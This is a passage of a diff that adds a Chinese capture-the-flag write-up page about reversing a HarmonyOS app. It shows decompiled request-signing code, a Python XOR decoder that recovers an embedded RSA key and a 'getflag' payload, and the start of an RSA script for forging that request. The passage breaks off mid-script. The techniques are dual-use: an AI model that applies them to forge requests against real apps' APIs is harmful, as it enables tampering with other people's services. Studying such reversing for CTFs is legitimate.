+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="err">#</span><span class="o">~</span><span class="nd">@0</span><span class="o">&lt;</span><span class="nd">@4</span><span class="o">*</span><span class="err">#</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">functionObject</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">newTarget</span><span class="p">,</span><span class="w"> </span><span class="n">utils</span><span class="w"> </span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">arg0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;data\&#34;:\&#34;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">arg0</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\&#34;}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ldlexvar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_lexenv_0_0_</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ldlexvar</span><span class="p">.</span><span class="na">request</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ldlexvar2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_lexenv_0_1_</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">obj2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createobjectwithbuffer</span><span class="p">(</span><span class="o">[</span><span class="s">&#34;method&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;extraData&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;header&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">obj2</span><span class="p">.</span><span class="na">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="err">{ </span><span class="nn">default</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="s">&#34;@ohos:net.http&#34;</span><span class="p">.</span><span class="na">RequestMethod</span><span class="p">.</span><span class="na">POST</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">obj2</span><span class="p">.</span><span class="na">extraData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">obj3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createobjectwithbuffer</span><span class="p">(</span><span class="o">[</span><span class="s">&#34;Authorization&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;X-Sign&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Accept&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/ apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#34;</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ldlexvar3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_lexenv_1_0_</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">obj4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ldlexvar3</span><span class="p">.</span><span class="na">o0OO00O</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ldlexvar4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_lexenv_0_2_</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ldlexvar5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_lexenv_1_0_</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">obj3</span><span class="p">.</span><span class="na">Authorization</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj4</span><span class="p">(</span><span class="n">ldlexvar4</span><span class="p">,</span><span class="w"> </span><span class="n">ldlexvar5</span><span class="p">.</span><span class="na">oo0Oo0</span><span class="p">(</span><span class="n">_lexenv_1_0_</span><span class="p">.</span><span class="na">Secret</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CryptoJS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="err">{ </span><span class="nn">default</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">CryptoJS</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="s">&#34;@normalized:N&amp;&amp;&amp;@ohos/crypto-js/index&amp;2.0.0&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">MD5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CryptoJS</span><span class="p">.</span><span class="na">MD5</span><span class="p">(</span><span class="n">i</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">obj3</span><span class="p">.</span><span class="na">X</span><span class="o">-</span><span class="n">Sign</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MD5</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">obj2</span><span class="p">.</span><span class="na">header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj3</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">callthisN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">(</span><span class="n">ldlexvar2</span><span class="p">,</span><span class="w"> </span><span class="n">obj2</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">callthisN</span><span class="p">.</span><span class="na">then</span><span class="p">(</span><span class="err">#</span><span class="o">~</span><span class="nd">@0</span><span class="o">&lt;</span><span class="nd">@4</span><span class="o">**</span><span class="err">#</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的X-sign逻辑是md5加密data请求体，前面还有部分混淆没解</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor_decode</span><span class="p">(</span><span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;134522123&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encoded</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;1&#34;</span><span class="p">:</span> <span class="s2">&#34;c`u</span><span class="se">\u0007\u0002\u0006\t</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;2&#34;</span><span class="p">:</span> <span class="s2">&#34;c`u</span><span class="se">\u0007\u0002\u0006\t</span><span class="s2">Nczpg</span><span class="se">\u0004</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;3&#34;</span><span class="p">:</span> <span class="s2">&#34;W_UR&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;4&#34;</span><span class="p">:</span> <span class="s2">&#34;|z}w{Xp|qVXE]Y[v</span><span class="se">\u000b</span><span class="s2">D</span><span class="se">\u0001</span><span class="s2">qudwtps|rre</span><span class="se">\r</span><span class="s2">s</span><span class="se">\u007f</span><span class="s2">x{qrT</span><span class="se">\u007f</span><span class="s2">vscts</span><span class="se">\u0005</span><span class="s2">ykF</span><span class="se">\u0004</span><span class="s2">~a~J</span><span class="se">\u0001</span><span class="s2">@</span><span class="se">\n\u0003</span><span class="s2">YaD</span><span class="se">\u0001</span><span class="s2">B</span><span class="se">\u0004</span><span class="s2">K9</span><span class="se">\\</span><span class="s2">DFUH</span><span class="se">\u001d</span><span class="s2">yFDc[Fw</span><span class="se">\u0006\u0001</span><span class="s2">guxsxaJ</span><span class="se">\u0007</span><span class="s2">h</span><span class="se">\u0006</span><span class="s2">]aGqGd[p[Dtd|</span><span class="se">\u0002\u0007\u0001</span><span class="s2">dXYG}RPsAB~</span><span class="se">\u0005</span><span class="s2">K@F|ZFYtW|</span><span class="se">\u007f</span><span class="s2">?A</span><span class="se">\u0006</span><span class="s2">~aG</span><span class="se">\u0006</span><span class="s2">cN}dKV^XVDl</span><span class="se">\u0002</span><span class="s2">j</span><span class="se">\u0002\u0005</span><span class="s2">Cukxzzkkua</span><span class="se">\u0005</span><span class="s2">d^</span><span class="se">\u001f</span><span class="s2">RhP</span><span class="se">\u0004</span><span class="s2">jkFZe</span><span class="se">\r</span><span class="s2">uQwCUtYV~P~[DVVfc@@8y</span><span class="se">\u0006</span><span class="s2">@G</span><span class="se">\u0000</span><span class="s2">{Ea{{}ZeX</span><span class="se">\\</span><span class="s2">xhCrYU~gaM~t</span><span class="se">\u0000\u0019</span><span class="s2">^Fup</span><span class="se">\u007f</span><span class="s2">dF</span><span class="se">\u0004</span><span class="s2">q|`q</span><span class="se">\u001b</span><span class="s2">S@tAA</span><span class="se">\u001c</span><span class="s2">d</span><span class="se">\u0006\u001f</span><span class="s2">zAB[</span><span class="se">\u007f</span><span class="s2">tpeSz`P_8</span><span class="se">\n\b</span><span class="s2">fAL</span><span class="se">\u000b</span><span class="s2">ykAt`Dl</span><span class="se">\u0007</span><span class="s2">W</span><span class="se">\u0019\u007f</span><span class="s2">DExr@y|Sf</span><span class="se">\u0003</span><span class="s2">_HPd</span><span class="se">\u0005</span><span class="s2">jf`[k_[Y</span><span class="se">\u001e</span><span class="s2">Y</span><span class="se">\u0003\u001a</span><span class="s2">U</span><span class="se">\u000b</span><span class="s2">|tg</span><span class="se">\u0005\u0003</span><span class="s2">fAgiEDAw@vdsD;x</span><span class="se">\u001b\\</span><span class="s2">|PrubUxe</span><span class="se">\u0002\u0005</span><span class="s2">x</span><span class="se">\u001e</span><span class="s2">Vv~</span><span class="se">\u0000</span><span class="s2">mrkzzww</span><span class="se">\u0003</span><span class="s2">d</span><span class="se">\u007f</span><span class="s2">XsBuur</span><span class="se">\u0001</span><span class="s2">_zb]G</span><span class="se">\u0006\u0004\u000b</span><span class="s2">u</span><span class="se">\u0003</span><span class="s2">PvzJ~EfdDs|cE</span><span class="se">\u001e</span><span class="s2">qp</span><span class="se">\u0000</span><span class="s2">@&gt;aE{usbpq&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;5&#34;</span><span class="p">:</span> <span class="s2">&#34;J</span><span class="se">\u0011</span><span class="s2">UVF[^</span><span class="se">\\\u0011\u000b\u0011</span><span class="s2">SPFT]ST</span><span class="se">\u0013</span><span class="s2">N&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;解码结果:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">name</span><span class="p">,</span> <span class="n">code</span> <span class="ow">in</span> <span class="n">encoded</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">decoded</span> <span class="o">=</span> <span class="n">xor_decode</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">code</span><span class="si">!r}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">decoded</span><span class="si">!r}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1: &#39;c`u\x07\x02\x06\t&#39; -&gt; &#39;RSA2048&#39;
+</span></span><span class="line"><span class="cl">2: &#39;c`u\x07\x02\x06\tNczpg\x04&#39; -&gt; &#39;RSA2048|PKCS1&#39;
+</span></span><span class="line"><span class="cl">3: &#39;W_UR&#39; -&gt; &#39;flag&#39;
+</span></span><span class="line"><span class="cl">4: &#39;|z}w{Xp|qVXE]Y[v\x0bD\x01qudwtps|rre\rs\x7fx{qrT\x7fvscts\x05ykF\x04~a~J\x01@\n\x03YaD\x01B\x04K9\\DFUH\x1dyFDc[Fw\x06\x01guxsxaJ\x07h\x06]aGqGd[p[Dtd|\x02\x07\x01dXYG}RPsAB~\x05K@F|ZFYtW|\x7f?A\x06~aG\x06cN}dKV^XVDl\x02j\x02\x05Cukxzzkkua\x05d^\x1fRhP\x04jkFZe\ruQwCUtYV~P~[DVVfc@@8y\x06@G\x00{Ea{{}ZeX\\xhCrYU~gaM~t\x00\x19^Fup\x7fdF\x04q|`q\x1bS@tAA\x1cd\x06\x1fzAB[\x7ftpeSz`P_8\n\x08fAL\x0bykAt`Dl\x07W\x19\x7fDExr@y|Sf\x03_HPd\x05jf`[k_[Y\x1eY\x03\x1aU\x0b|tg\x05\x03fAgiEDAw@vdsD;x\x1b\\|PrubUxe\x02\x05x\x1eVv~\x00mrkzzww\x03d\x7fXsBuur\x01_zb]G\x06\x04\x0bu\x03PvzJ~EfdDs|cE\x1eqp\x00@&gt;aE{usbpq&#39; -&gt; &#39;MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z\nhqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK\ns4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur\nH4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn\n99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw\nK/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s\nTwIDAQAB&#39;
+</span></span><span class="line"><span class="cl">5: &#39;J\x11UVF[^\\\x11\x0b\x11SPFT]ST\x13N&#39; -&gt; &#39;{&#34;action&#34;:&#34;getflag&#34;}&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>RSA加密，直接搓脚本生成</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.asymmetric</span> <span class="kn">import</span> <span class="n">padding</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Optional</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">RSAEncryptor</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;RSA加密工具类&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">public_key_pem</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        初始化RSA加密器
+</span></span></span><span class="line"><span class="cl"><span class="s2">        
+</span></span></span><span class="line"><span class="cl"><span class="s2">        参数:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            public_key_pem: PEM格式的RSA公钥字符串
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">public_key</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_load_public_key</span><span class="p">(</span><span class="n">public_key_pem</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="nd">@staticmethod</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_load_public_key</span><span class="p">(</span><span class="n">public_key_pem</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;加载PEM格式的公钥&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">serialization</span><span class="o">.</span><span class="n">load_pem_public_key</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">public_key_pem</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">                <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;无效的公钥格式&#34;</span><span class="p">)</span> <span class="kn">from</span> <span class="nn">e</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">encoding</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        RSA加密消息
+</span></span></span><span class="line"><span class="cl"><span class="s2">        
+</span></span></span><span class="line"><span class="cl"><span class="s2">        参数:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            message: 要加密的原始消息
+</span></span></span><span class="line"><span class="cl"><span class="s2">            encoding: 消息编码方式(默认utf-8)
+</span></span></span><span class="line"><span class="cl"><span class="s2">            
+</span></span></span><span class="line"><span class="cl"><span class="s2">        返回:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            Base64编码的加密结果字符串
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ciphertext</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">public_key</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">message</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">encoding</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="n">padding</span><span class="o">.</span><span class="n">PKCS1v15</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;加密失败: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># RSA公钥</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PUBLIC_KEY_PEM</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    -----BEGIN PUBLIC KEY-----
+</span></span></span><span class="line"><span class="cl"><span class="s2">    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z
+</span></span></span><span class="line"><span class="cl"><span class="s2">    hqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK
+</span></span></span><span class="line"><span class="cl"><span class="s2">    s4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur
+</span></span></span><span class="line"><span class="cl"><span class="s2">    H4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn
+</span></span></span><span class="line"><span class="cl"><span class="s2">    99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw
+</span></span></span><span class="line"><span class="cl"><span class="s2">    K/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s
+</span></span></span><span class="line"><span class="cl"><span class="s2">    TwIDAQAB
+</span></span></span><span class="line"><span class="cl"><span class="s2">    -----END PUBLIC KEY-----
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># 要加密的JSON数据</span>
+</span></span><span class="line"><span class="cl">    <span class="n">message</span> <span class="o">=</span> <span class="s1">&#39;{&#34;action&#34;:&#34;getflag&#34;}&#39;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 创建加密器实例</span>
+</span></span><span class="line"><span class="cl">        <span class="n">encryptor</span> <span class="o">=</span> <span class="n">RSAEncryptor</span><span class="p">(</span><span class="n">PUBLIC_KEY_PEM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># 执行加密</span>
